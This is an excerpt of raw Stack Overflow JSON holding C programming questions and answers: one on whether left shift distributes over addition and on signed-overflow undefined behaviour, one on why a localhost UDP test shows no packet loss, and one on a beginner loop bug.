0101 = 1000\n(x+y)&lt;&lt;c = 0001&lt;&lt;-1 = 0000 &lt;-- the first 1 gets lost in the transaction</code></p>\n\n<p>The rest should work as long as <code>c&lt;w</code>, because if it gets shifted to far, both operations still do the same. If <code>c&gt;=w</code> your definition will work aswell, as its simply a <code>0==0</code> then.</p>\n\n<p>Example:</p>\n\n<p><code>(x+y)&lt;&lt;c = (x&lt;&lt;c) + (y&lt;&lt;c)\nw=4; c=4; x=1; y=10;\nSo you got 0001 and 1010:\n(x&lt;&lt;c) + (y&lt;&lt;c) = 0000 + 0000 = 0000\n(x+y)&lt;&lt;c = 0001&lt;&lt;4 = 0000</code></p>\n\n<p>So the main rule should be:</p>\n\n<p><code>(x+y)&lt;&lt;c = (x&lt;&lt;c) + (y&lt;&lt;c)</code> is true, as long as <code>c&gt;=0</code></p>\n\n<p>Hope this is well explained :)</p>\n"}, {"tags": [], "owner": {"reputation": 10157, "user_id": 53491, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/c79083b696c8a63b10dc59b286a24ef6?s=128&d=identicon&r=PG", "display_name": "Brian Postow", "link": "https://stackoverflow.com/users/53491/brian-postow"}, "is_accepted": false, "score": 1, "last_activity_date": 1444859908, "creation_date": 1444859908, "answer_id": 33136319, "question_id": 33133794, "link": "https://stackoverflow.com/questions/33133794/bitwise-leftshift-operator-distribute-over-addition/33136319#33136319", "title": "Bitwise leftshift operator distribute over addition", "body": "<p>Leftshift is just multiplying by a power of 2. So, <code>(x+y)&lt;&lt; c = (x+y)*2^c</code>. Lets say <code>C = 2^c</code> for easy of reading. so, <code>(x+y)&lt;&lt;c = (x+y)* C = Cx + Cy = x&lt;&lt;c + y&lt;&lt;c</code>.</p>\n\n<p>As others have said, this only works if <code>0 &lt; c &lt; w</code>... </p>\n"}, {"comments": [{"owner": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "edited": false, "score": 0, "creation_date": 1444874335, "post_id": 33136474, "comment_id": 54088310, "body": "True but most machines implement Two&#39;s-Complement integer arithmetic and I am assuming Two&#39;s Complement integer arithmetic. Also I am assuming that any 1s that <i>run out of space</i> are simply dropped off, which I think is intuitive."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "edited": false, "score": 0, "creation_date": 1444877633, "post_id": 33136474, "comment_id": 54089119, "body": "@Sanfer You are missing a big issue. since the C spec says it is undefined behavior, C compilers, even on 2&#39;s complement machines, use UB to its advantage to make optimized code.  So in C, you <b>cannot</b> count that <code>int</code>-overflow will act in <i>any</i> prescribe fashion like &quot;1s that run out of space are simply dropped off&quot;  That is not how optimized C compilers work in 2015."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "edited": false, "score": 0, "creation_date": 1444878128, "post_id": 33136474, "comment_id": 54089226, "body": "@Sanfer  Suggest careful read of   <a href=\"http://stackoverflow.com/questions/29655664/what-replacements-are-available-for-formerly-widely-supported-behaviors-not-defi\" title=\"what replacements are available for formerly widely supported behaviors not defi\">stackoverflow.com/questions/29655664/&hellip;</a>"}, {"owner": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "edited": false, "score": 0, "creation_date": 1444881245, "post_id": 33136474, "comment_id": 54090061, "body": "The standard says it&#39;s undefined/unbounded only if the right operand is negative or greater than or equal to the width of the left operand. Here the width of the left operand is <code>w</code>. I&#39;m assuming that <code>0 &lt;= c &lt; w</code>, so we&#39;re within predictable behaviour. I fail to see the issue once a Two&#39;s Complement arithmetic is assumed. Two&#39;s complement arithmetic defines pretty clearly what to do with overflows, I&#39;m genuinely not sure what the trouble is here."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "edited": false, "score": 0, "creation_date": 1444884416, "post_id": 33136474, "comment_id": 54090885, "body": "@Sanfer  1) &quot;... it&#39;s undefined/unbounded only if the right ...&quot; is not true.  That is only <i>one</i> reason. 2) <code>w</code> is not the issue. <code>(x+y)&lt;&lt;c</code>, <code>(x&lt;&lt;c)</code>, <code>(y&lt;&lt;c)</code> is the issue. Two&#39;s complement arithmetic does defined things, but C is not oblige to follow that, even on a 2&#39;s complement machine.  The trouble is assuming that C must follow 2&#39;s complement math on overflow."}, {"owner": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "edited": false, "score": 1, "creation_date": 1444885508, "post_id": 33136474, "comment_id": 54091221, "body": "I see, thanks for elaborating. Although my question was more abstract than anything else, I&#39;m curious. What is C obliged to follow in terms of arithmetic? Seeing that arithmetic is such a fundamental part of computation and that overflow is inevitable in fixed word-size languages like C, it must be defined to something, but what?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "edited": false, "score": 0, "creation_date": 1444886096, "post_id": 33136474, "comment_id": 54091382, "body": "@Sanfer When, shift, addition, subtraction, multiplication, etc. does not overflow (answer above <code>INT_MAX</code> or below <code>INT_MIN</code>), C must follow that.  <code>1+1 --&gt; 2</code>.  When the &quot;correct&quot; answer is outside the range of <code>int</code>, the behavior can be <i>anything</i>.  C signed integer arithmetic in those cases is not defined.  Unsigned math is another matter.  Moral of the story: do not overflow <code>int</code> math."}, {"owner": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "edited": false, "score": 0, "creation_date": 1444886874, "post_id": 33136474, "comment_id": 54091646, "body": "Oh dear God. So there&#39;s no standard way to detect overflows neither then?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "edited": false, "score": 0, "creation_date": 1444887116, "post_id": 33136474, "comment_id": 54091734, "body": "@Sanfer Welcome to C.  Do not <i>detect</i> overflow - it is too late.  Just do not do it in the first place.  Consider even simple addition: <a href=\"http://codereview.stackexchange.com/questions/37177/simpler-method-to-detect-int-overflow\" title=\"simpler method to detect int overflow\">codereview.stackexchange.com/questions/37177/&hellip;</a> and my <a href=\"http://codereview.stackexchange.com/questions/37177/simpler-method-to-detect-int-overflow#comment61303_37178\">comment</a>"}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 2, "last_activity_date": 1444861060, "last_edit_date": 1592644375, "creation_date": 1444860615, "answer_id": 33136474, "question_id": 33133794, "link": "https://stackoverflow.com/questions/33133794/bitwise-leftshift-operator-distribute-over-addition/33136474#33136474", "title": "Bitwise leftshift operator distribute over addition", "body": "<blockquote>\n<p>is it true that (given <code>0 &lt;= c &lt; w</code>) <code>int x,y; (x+y)&lt;&lt;c = (x&lt;&lt;c) + (y&lt;&lt;c)</code>?</p>\n</blockquote>\n<p>If <code>c &lt; w</code> is true and <code>x+y</code> does not overflow and neither does <code>(x+y)&lt;&lt;c</code>, <code>x&lt;&lt;c</code>, <code>y&lt;&lt;c</code> overflow, it is true as this is a simple associative multiplication by a power of 2.</p>\n<p>Else no.  Overflow due to shifting of a signed integer is undefined behavior.  Shifting a digit into the sign bit in UB.  Overflow due to adding is UB.</p>\n<blockquote>\n<p>If the value of the right operand is negative or is greater than or equal to the width of the promoted left operand, the behavior is undefined.  C11 \u00a76.5.7 3</p>\n<p>An example of undefined behavior is the behavior on integer overflow.  C11 \u00a73.4.3 3</p>\n</blockquote>\n"}], "owner": {"reputation": 343, "user_id": 4646773, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4810297e2018a13f7ff3fe7031b66fa9?s=128&d=identicon&r=PG&f=1", "display_name": "Sanfer", "link": "https://stackoverflow.com/users/4646773/sanfer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 376, "favorite_count": 0, "accepted_answer_id": 33136474, "answer_count": 3, "score": 2, "last_activity_date": 1444861060, "creation_date": 1444850255, "last_edit_date": 1592644375, "question_id": 33133794, "link": "https://stackoverflow.com/questions/33133794/bitwise-leftshift-operator-distribute-over-addition", "title": "Bitwise leftshift operator distribute over addition", "body": "<p>There's a thread on this for logical right-shift operators but I haven't found any for logical left-shift operators. My question is for any fixed word-size language with word-size <code>w</code>, an integer constant <code>0 &lt;= c &lt; w</code> and variables <code>int x</code> and <code>int y</code>, is it true that</p>\n<p><code>(x+y)&lt;&lt;c = (x&lt;&lt;c) + (y&lt;&lt;c)</code></p>\n<p>?</p>\n<p>It appears that this should be true because all addition carries go to the left so shifting to the left should only lose the same sequence of bits on both sides.</p>\n<p>Would the relation be true if <code>c &gt;= w</code> ?</p>\n<p>Turns out I figured it out. Here's the proof</p>\n<h2><strong>PROOF</strong></h2>\n<p>Let word-size <code>w</code> be arbitrary. Choose any two signed variable <code>int x</code> and <code>int y</code> within this word-size, and let the integer constant <code>c</code> satisfy <code>0 &lt;= c &lt; w</code>. Define two new variables <code>int xW2</code> and <code>int yW2</code> such that they can store bit-sequences of length <code>2*w + 1</code>. Copy the bit-sequence of <code>x</code> and <code>y</code> into <code>xW2</code> and <code>yW2</code> such that <code>xW2 = x</code> and <code>yW2 = y</code>, i.e they have equal values. Then <code>xW2 &lt;&lt; c</code> and <code>yW2 &lt;&lt; c</code> do not overflow. Moreover <code>(xW2&lt;&lt;c) + (yW2&lt;&lt;c)</code> does not overflow as well. But the resulting bit-sequence is identical to <code>xW2 + yW2</code> with <code>c</code> 0s appended to the least significant bit of that sum. Therefore <code>(xW2 + yW2)&lt;&lt;c = (xW2&lt;&lt;c) + (yW2&lt;&lt;c)</code>. It follows from the fact that truncating both bit-sequences by <code>w-bits</code> does not violate the equality so it must be that <code>(x+y)&lt;&lt;c = (x&lt;&lt;c)+(y&lt;&lt;c)</code>. That's all folks.</p>\n"}, {"tags": ["c", "network-programming", "udp", "data-loss"], "answers": [{"tags": [], "owner": {"reputation": 8993, "user_id": 1354537, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/24aaaba3c6140eaef24f9ed711644033?s=128&d=identicon&r=PG", "display_name": "Marged", "link": "https://stackoverflow.com/users/1354537/marged"}, "is_accepted": true, "score": 3, "last_activity_date": 1444850418, "last_edit_date": 1495541673, "creation_date": 1444850418, "answer_id": 33133830, "question_id": 33133642, "link": "https://stackoverflow.com/questions/33133642/possible-causes-for-lack-of-data-loss-over-my-localhost-udp-protocol/33133830#33133830", "title": "Possible causes for lack of data loss over my localhost UDP protocol?", "body": "<p>The reason why you are not seeing any lost datagrams is that your network stack is simply not running into any trouble.\nYour localhost connection can easily cope with what you provide, a localhost connection is able to process several 100 megabyte of data per second on a decent CPU.</p>\n\n<p>To see dropped datagrams you should increase the probability of interference. You have several opportunities:</p>\n\n<ul>\n<li>increase the load on the network</li>\n<li>busy your cpu with other tasks</li>\n<li>use a \"real\" network and transfer data between real machines</li>\n<li>run your code over a dsl line</li>\n<li>set up a virtual machine and simulate network outages (Vmware Workstation is able to do so)</li>\n</ul>\n\n<p>And this might be an interesting read: <a href=\"https://stackoverflow.com/questions/7968566/what-would-cause-udp-packets-to-be-dropped-when-being-sent-to-localhost\">What would cause UDP packets to be dropped when being sent to localhost?</a></p>\n"}], "owner": {"reputation": 47, "user_id": 5182603, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/VoP84.gif?s=128&g=1", "display_name": "tsuby", "link": "https://stackoverflow.com/users/5182603/tsuby"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 397, "favorite_count": 0, "accepted_answer_id": 33133830, "answer_count": 1, "score": 1, "last_activity_date": 1444850418, "creation_date": 1444849736, "question_id": 33133642, "link": "https://stackoverflow.com/questions/33133642/possible-causes-for-lack-of-data-loss-over-my-localhost-udp-protocol", "title": "Possible causes for lack of data loss over my localhost UDP protocol?", "body": "<p>I just implemented my first UDP server/client. The server is on localhost.\nI'm sending 64kb of data from client to server, which the server is supposed to send back. Then, the client checks how many of the 64kb are still intact and they all are. Always.\nWhat are the possible causes for this behaviour? I was expecting at least -some- dataloss.  </p>\n\n<p>client code: <a href=\"http://pastebin.com/5HLkfcqS\" rel=\"nofollow\">http://pastebin.com/5HLkfcqS</a>\nserver code: <a href=\"http://pastebin.com/YrhfJAGb\" rel=\"nofollow\">http://pastebin.com/YrhfJAGb</a> </p>\n\n<p>PS: A newbie in network programming here, so please don't be too harsh. I couldn't find an answer for my problem.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 165655, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 1, "creation_date": 1444849442, "post_id": 33133478, "comment_id": 54078612, "body": "This line of code does nothing <code>while (gross != 0);</code>."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1444849480, "post_id": 33133478, "comment_id": 54078634, "body": "All those <code>if</code> statements can be replaced with a single statement <code>if (commission &gt;= 100) {salesperson[commission&#47;100 - 1]++;}</code>"}, {"owner": {"reputation": 733, "user_id": 101039, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/88oCA.png?s=128&g=1", "display_name": "JPhi1618", "link": "https://stackoverflow.com/users/101039/jphi1618"}, "edited": false, "score": 2, "creation_date": 1444849496, "post_id": 33133478, "comment_id": 54078646, "body": "This should be migrated to CodeReview.stackexchange.com, but <code>while(gross != 0);</code> is a while statement missing a body."}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1444849588, "post_id": 33133478, "comment_id": 54078698, "body": "Compile with all warnings &amp; debug info (e.g. <code>gcc -Wall -Wextra -g</code> if using <a href=\"http://gcc.gnu.org/\" rel=\"nofollow noreferrer\">GCC</a>...) then <b>use the debugger</b> (<code>gdb</code>)"}, {"owner": {"reputation": 6770, "user_id": 3658660, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5b40f4e2bead9eca6951da110a3c84e7?s=128&d=identicon&r=PG&f=1", "display_name": "hlscalon", "link": "https://stackoverflow.com/users/3658660/hlscalon"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1444849633, "post_id": 33133478, "comment_id": 54078727, "body": "@Barmar nice, but should include a case where <code>comission &gt;= 1000</code> . Apparently it can be <code>&lt;= 3000</code> and that is index 9"}, {"owner": {"reputation": 733, "user_id": 101039, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/88oCA.png?s=128&g=1", "display_name": "JPhi1618", "link": "https://stackoverflow.com/users/101039/jphi1618"}, "edited": false, "score": 0, "creation_date": 1444849715, "post_id": 33133478, "comment_id": 54078770, "body": "Is there not a <code>homework</code> tag any more?  I never see mods or OPs add it."}, {"owner": {"reputation": 48201, "user_id": 1250772, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/633e1f643d2c9b043231b4a32b078907?s=128&d=identicon&r=PG", "display_name": "Kaz", "link": "https://stackoverflow.com/users/1250772/kaz"}, "edited": false, "score": 0, "creation_date": 1444849822, "post_id": 33133478, "comment_id": 54078833, "body": "The program is hard to change, because for each bar in the salary histogram, there are several pieces of code. You should define a data structure (such as an array of structures) which defines the number of categories and their commission ranges, and then do loops over table. The program will be much shorter, and it will be a cinch to add, remove or adjust ranges."}, {"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1444849976, "post_id": 33133478, "comment_id": 54078928, "body": "@Barmar - yes, that would do most of it but will also scare the bejesus out of somebody in a CS 101 (C language) course"}, {"owner": {"reputation": 12398, "user_id": 1310566, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/5qiMO.jpg?s=128&g=1", "display_name": "Simon Forsberg", "link": "https://stackoverflow.com/users/1310566/simon-forsberg"}, "reply_to_user": {"reputation": 733, "user_id": 101039, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/88oCA.png?s=128&g=1", "display_name": "JPhi1618", "link": "https://stackoverflow.com/users/101039/jphi1618"}, "edited": false, "score": 0, "creation_date": 1444851486, "post_id": 33133478, "comment_id": 54079787, "body": "@JPhi1618 It belongs on Stack Overflow, not code review. Please read <a href=\"http://meta.codereview.stackexchange.com/questions/5777/a-guide-to-code-review-for-stack-overflow-users\">A Guide to Code Review for Stack Overflow users</a>"}, {"owner": {"reputation": 12398, "user_id": 1310566, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/5qiMO.jpg?s=128&g=1", "display_name": "Simon Forsberg", "link": "https://stackoverflow.com/users/1310566/simon-forsberg"}, "reply_to_user": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "edited": false, "score": 1, "creation_date": 1444851542, "post_id": 33133478, "comment_id": 54079819, "body": "@KevinDTimm It&#39;s not an option because people keep on making inaccurate recommendations. This question does not belong on Code Review, please read <a href=\"http://meta.codereview.stackexchange.com/questions/5777/a-guide-to-code-review-for-stack-overflow-users\">A Guide to Code Review for Stack Overflow users</a>"}, {"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "reply_to_user": {"reputation": 12398, "user_id": 1310566, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/5qiMO.jpg?s=128&g=1", "display_name": "Simon Forsberg", "link": "https://stackoverflow.com/users/1310566/simon-forsberg"}, "edited": false, "score": 0, "creation_date": 1444851666, "post_id": 33133478, "comment_id": 54079887, "body": "@SimonForsberg - since the purpose of CR always escapes me I think I&#39;ll just forget it exists."}, {"owner": {"reputation": 733, "user_id": 101039, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/88oCA.png?s=128&g=1", "display_name": "JPhi1618", "link": "https://stackoverflow.com/users/101039/jphi1618"}, "reply_to_user": {"reputation": 12398, "user_id": 1310566, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/5qiMO.jpg?s=128&g=1", "display_name": "Simon Forsberg", "link": "https://stackoverflow.com/users/1310566/simon-forsberg"}, "edited": false, "score": 0, "creation_date": 1444851695, "post_id": 33133478, "comment_id": 54079897, "body": "@SimonForsberg, point taken - I see the mistake now.  Just for clarification, if the OP had said &quot;how can I improve this code&quot; rather than &quot;why am I getting 0&quot;, would it then be appropriate on CR.SE?"}, {"owner": {"reputation": 1502, "user_id": 1014587, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/990x8.jpg?s=128&g=1", "display_name": "Mast", "link": "https://stackoverflow.com/users/1014587/mast"}, "reply_to_user": {"reputation": 733, "user_id": 101039, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/88oCA.png?s=128&g=1", "display_name": "JPhi1618", "link": "https://stackoverflow.com/users/101039/jphi1618"}, "edited": false, "score": 0, "creation_date": 1444851982, "post_id": 33133478, "comment_id": 54080066, "body": "@JPhi1618 Faulty code is faulty code, regardless of description."}, {"owner": {"reputation": 12398, "user_id": 1310566, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/5qiMO.jpg?s=128&g=1", "display_name": "Simon Forsberg", "link": "https://stackoverflow.com/users/1310566/simon-forsberg"}, "reply_to_user": {"reputation": 733, "user_id": 101039, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/88oCA.png?s=128&g=1", "display_name": "JPhi1618", "link": "https://stackoverflow.com/users/101039/jphi1618"}, "edited": false, "score": 0, "creation_date": 1444853055, "post_id": 33133478, "comment_id": 54080696, "body": "@JPhi1618 CR is all about improving real code that already works. As long as the code works and the question is how it can be improved, it is on-topic for CR.SE."}, {"owner": {"reputation": 12398, "user_id": 1310566, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/5qiMO.jpg?s=128&g=1", "display_name": "Simon Forsberg", "link": "https://stackoverflow.com/users/1310566/simon-forsberg"}, "reply_to_user": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "edited": false, "score": 1, "creation_date": 1444853120, "post_id": 33133478, "comment_id": 54080738, "body": "@KevinDTimm In a nutshell, CR is about improving code that already works. I recommend that you visit <a href=\"http://chat.stackexchange.com/rooms/8595/the-2nd-monitor\">The 2nd Monitor</a> where Code Review regulars can help you understand the site&#39;s scope better. We&#39;re also a quite friendly bunch."}, {"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "reply_to_user": {"reputation": 12398, "user_id": 1310566, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/5qiMO.jpg?s=128&g=1", "display_name": "Simon Forsberg", "link": "https://stackoverflow.com/users/1310566/simon-forsberg"}, "edited": false, "score": 0, "creation_date": 1444853247, "post_id": 33133478, "comment_id": 54080821, "body": "@SimonForsberg - thanks for the update, maybe I won&#39;t expunge you all just yet ;)"}], "answers": [{"comments": [{"owner": {"reputation": 5, "user_id": 5446498, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34e7ccda3eb9d5821d337c32f557c352?s=128&d=identicon&r=PG&f=1", "display_name": "dee j", "link": "https://stackoverflow.com/users/5446498/dee-j"}, "edited": false, "score": 0, "creation_date": 1444850666, "post_id": 33133581, "comment_id": 54079334, "body": "thank you guys i did that  i am still getting 0 for my results"}, {"owner": {"reputation": 5, "user_id": 5446498, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/34e7ccda3eb9d5821d337c32f557c352?s=128&d=identicon&r=PG&f=1", "display_name": "dee j", "link": "https://stackoverflow.com/users/5446498/dee-j"}, "edited": false, "score": 0, "creation_date": 1444851772, "post_id": 33133581, "comment_id": 54079937, "body": "if i wanted it to generate by using a random int how would i do that?"}, {"owner": {"reputation": 1031, "user_id": 3933895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8c3eff8d3f5166ea0f7974afbfcdd5ca?s=128&d=identicon&r=PG&f=1", "display_name": "Samidamaru", "link": "https://stackoverflow.com/users/3933895/samidamaru"}, "edited": false, "score": 0, "creation_date": 1444852313, "post_id": 33133581, "comment_id": 54080254, "body": "Inside your loop, instead of using scanf to get gross you could do something like: gross = rand()%3001; which generates a random number between 0 and 3000. But note that this is pseudo random and needs to be seeded to give you different answers each time you run the program. Google will tell you more on this. tutorialspoint.com/c_standard_library/c_function_rand.htm"}], "tags": [], "owner": {"reputation": 165655, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "is_accepted": false, "score": 0, "last_activity_date": 1444849531, "creation_date": 1444849531, "answer_id": 33133581, "question_id": 33133478, "link": "https://stackoverflow.com/questions/33133478/intro-to-programming-c/33133581#33133581", "title": "Intro to programming C", "body": "<p>Your loop doesn't have any body. Change this:</p>\n\n<pre><code>{\n    while (gross != 0);\n    printf(\"please enter a number from 0-3000 %\\n;\");\n    printf(\"Enter gross sales: \");\n    scanf(\"%d\", &amp;gross);\n    commission = 100 + (.09 * gross);\n</code></pre>\n\n<p>To this:</p>\n\n<pre><code>while (1)\n{\n    printf(\"please enter a number from 0-3000 %\\n;\");\n    printf(\"Enter gross sales: \");\n    scanf(\"%d\", &amp;gross);\n    if (gross == 0) break;\n    commission = 100 + (.09 * gross);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 119716, "user_id": 643383, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/uQ5JF.png?s=128&g=1", "display_name": "Caleb", "link": "https://stackoverflow.com/users/643383/caleb"}, "is_accepted": false, "score": 1, "last_activity_date": 1444849833, "last_edit_date": 1444849833, "creation_date": 1444849532, "answer_id": 33133582, "question_id": 33133478, "link": "https://stackoverflow.com/questions/33133478/intro-to-programming-c/33133582#33133582", "title": "Intro to programming C", "body": "<p>You wrote this:</p>\n\n<pre><code>{\n    while (gross != 0);\n</code></pre>\n\n<p>But I think you meant this:</p>\n\n<pre><code>while (gross != 0)\n{\n</code></pre>\n\n<p>A <code>while</code> statement followed by a <code>;</code> is essentially a no-op -- the body of the loop is empty. If you want to repeat all the code inside the braces, the <code>while</code> needs to come before the opening brace. The code from the opening brace <code>{</code> to the closing brace <code>{</code> is the \"body\" of the loop, i.e. the part that gets executed on 